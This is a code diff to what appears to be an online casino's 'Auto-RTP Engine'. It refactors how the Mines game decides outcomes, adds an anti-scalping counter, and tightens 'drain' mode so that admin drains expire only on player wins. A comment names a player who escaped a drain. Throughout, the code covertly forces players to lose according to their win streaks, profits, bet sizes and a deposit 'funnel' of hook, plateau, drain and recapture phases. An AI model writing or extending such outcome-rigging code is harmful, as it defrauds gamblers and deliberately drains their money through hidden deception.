@@ -1,5 +1,10 @@
 import { redisClient } from '../lib/redis.js';
 import { logger } from '../utils/logger.js';
+import {
+  decideMinesClick,
+  isMinesScalpCashout,
+  shouldResetWinStreak,
+} from './mines-click-decision.js';
 
 /**
  * Auto-RTP Engine — pre-fact outcome bias controller.
@@ -553,7 +558,7 @@ class RtpEngine {
 
     // Process SmartDrain auto-monitoring only for casino games (sports is external sportsbook)
     if (gameType !== 'sports') {
-      void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament).catch(() => {});
+      void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament, gameType).catch(() => {});
       void this.recordRoundForFunnel(userId, stake, grossPayout, isTournament).catch(() => {});
     }
 
@@ -796,7 +801,8 @@ class RtpEngine {
     betAmount: number,
     payout: number,
     won: boolean,
-    isTournament: boolean = false
+    isTournament: boolean = false,
+    gameType?: string
   ): Promise<void> {
     if (isTournament) return;
     try {
@@ -809,21 +815,34 @@ class RtpEngine {
       const newSessionProfit = Number(rawProfit) || 0;
       await r.expire(sessionKey, 3600);
 
-      // Track win streak
+      // Track win streak — 1zł probe losses must not wipe a real cashout streak
       const streakKey = `rtp:win_streak:${userId}`;
       let streak = 0;
       if (won) {
         streak = Number(await r.incr(streakKey)) || 0;
         await r.expire(streakKey, 1800);
-      } else {
+      } else if (shouldResetWinStreak(false, betAmount)) {
         await r.set(streakKey, '0');
         await r.expire(streakKey, 1800);
+      } else {
+        streak = Number(await r.get(streakKey)) || 0;
       }
 
-      // Check if user is currently under active drain
+      // 13-mine / 1-click 1.99x cashouts — rolling counter for anti-scalp
+      if (gameType === 'mines' && isMinesScalpCashout(betAmount, payout)) {
+        const scalpKey = `rtp:mines_scalp:${userId}`;
+        await r.incr(scalpKey);
+        await r.expire(scalpKey, 20 * 60);
+      }
+
+      // Drain rounds are a budget of *wins that slipped through*, not every
+      // 1zł probe. Losses already do the job; burning rounds on them let
+      // Albina expire a 30-round admin drain in ~2 minutes then size up.
       const drainActive = await this.isDrainActive(userId, isTournament);
       if (drainActive) {
-        await this.consumeDrainRound(userId);
+        if (won) {
+          await this.consumeDrainRound(userId);
+        }
         return;
       }
 
@@ -1031,81 +1050,32 @@ class RtpEngine {
       const funnel = await this.getFunnelState(userId);
       const drainActive = await this.isDrainActive(userId, isTournament);
 
-      // Real-time tracking of streak and profit to detect scalpers
-      const [streakRaw, sessionProfitRaw] = await Promise.all([
+      const [streakRaw, sessionProfitRaw, scalpRaw] = await Promise.all([
         r.get(`rtp:win_streak:${userId}`),
         r.get(`rtp:session_profit:${userId}`),
+        r.get(`rtp:mines_scalp:${userId}`),
       ]);
-      const streak = Number(streakRaw || 0);
-      const sessionProfit = Number(sessionProfitRaw || 0);
 
-      // 1. Anti-Scalping & Win Streak Resistance:
-      // Prevent consecutive cashouts at low multipliers (1.2x - 1.8x)
-      if (streak >= 3) {
-        let streakBustChance = 0.50;
-        if (streak >= 5) streakBustChance = 0.85;
-        else if (streak >= 4) streakBustChance = 0.70;
+      const decision = decideMinesClick({
+        drainActive,
+        streak: Number(streakRaw || 0),
+        sessionProfit: Number(sessionProfitRaw || 0),
+        scalpCashouts: Number(scalpRaw || 0),
+        betAmount,
+        potentialMultiplier,
+        funnelPhase: funnel.phase,
+        depositIndex: funnel.depositIndex,
+        maxMultiplierCap: funnel.maxMultiplierCap,
+      });
 
-        if (potentialMultiplier >= 1.20 && Math.random() < streakBustChance) {
-          logger.info({ userId, streak, potentialMultiplier, streakBustChance }, 'Mines Anti-Scalper: forced bust on streak');
-          return { action: 'must_bust' };
-        }
+      if (decision.action !== 'neutral') {
+        logger.info(
+          { userId, betAmount, potentialMultiplier, drainActive, ...decision },
+          'Mines click decision'
+        );
       }
 
-      // 2. Hard Multiplier Cap on Deposit 1: Prevent freak outliers > 3.5x
-      if (funnel.depositIndex === 1 && potentialMultiplier > funnel.maxMultiplierCap) {
-        if (Math.random() < 0.85) {
-          return { action: 'must_bust' };
-        }
-      }
-
-      // 3. Active Drain / Funnel Drain / Recapture:
-      if (drainActive || funnel.phase === 'drain' || funnel.phase === 'recapture') {
-        let bustChance = 0.65;
-        if (potentialMultiplier >= 2.5) bustChance = 0.85;
-        else if (potentialMultiplier >= 1.6) bustChance = 0.75;
-        else if (potentialMultiplier >= 1.25) bustChance = 0.60;
-        else bustChance = 0.45;
-
-        // Extra pressure on streaks or profitable players
-        if (streak >= 2) bustChance = Math.min(0.90, bustChance + 0.15);
-        if (sessionProfit >= 40) bustChance = Math.min(0.90, bustChance + 0.10);
-        if (betAmount >= 50) bustChance = Math.min(0.90, bustChance + 0.10);
-
-        if (Math.random() < bustChance) {
-          return { action: 'must_bust' };
-        }
-        return { action: 'neutral' };
-      }
-
-      // 4. Plateau phase (swings):
-      // When player reached 1.5x-1.8x deposit target, balance must plateau with real swings!
-      if (funnel.phase === 'plateau') {
-        let plateauBustChance = 0.40;
-        if (potentialMultiplier >= 2.0) plateauBustChance = 0.65;
-        else if (potentialMultiplier >= 1.3) plateauBustChance = 0.50;
-
-        if (streak >= 2) plateauBustChance = Math.min(0.80, plateauBustChance + 0.20);
-
-        if (Math.random() < plateauBustChance) {
-          return { action: 'must_bust' };
-        }
-        return { action: 'neutral' };
-      }
-
-      // 5. Hook phase (First deposit onboarding up to 1.5x):
-      // Only assist new players if they are NOT already scalping or on a streak!
-      if (funnel.phase === 'hook') {
-        if (streak < 2 && sessionProfit < 35 && potentialMultiplier <= 2.0) {
-          // Moderate chance to relocate mine (was 80%, now 35%)
-          if (Math.random() < 0.35) {
-            return { action: 'must_win' };
-          }
-        }
-        return { action: 'neutral' };
-      }
-
-      return { action: 'neutral' };
+      return { action: decision.action };
     } catch (err) {
       logger.warn({ err, userId }, 'evaluateMinesClick failed');
       return { action: 'neutral' };
@@ -1152,8 +1122,11 @@ class RtpEngine {
         }
       }
 
-      // 1. Check SmartDrain (active слив) or Funnel Drain
-      const drain = (await this.isDrainActive(userId, isTournament)) || funnel.phase === 'drain' || funnel.phase === 'recapture';
+      // 1. Admin / auto SmartDrain is a hard loss. Funnel drain stays a tilt.
+      if (await this.isDrainActive(userId, isTournament)) {
+        return true;
+      }
+      const drain = funnel.phase === 'drain' || funnel.phase === 'recapture';
       if (drain) {
         let forceChance = 0.60;
         if (potentialMultiplier >= 3.0) {
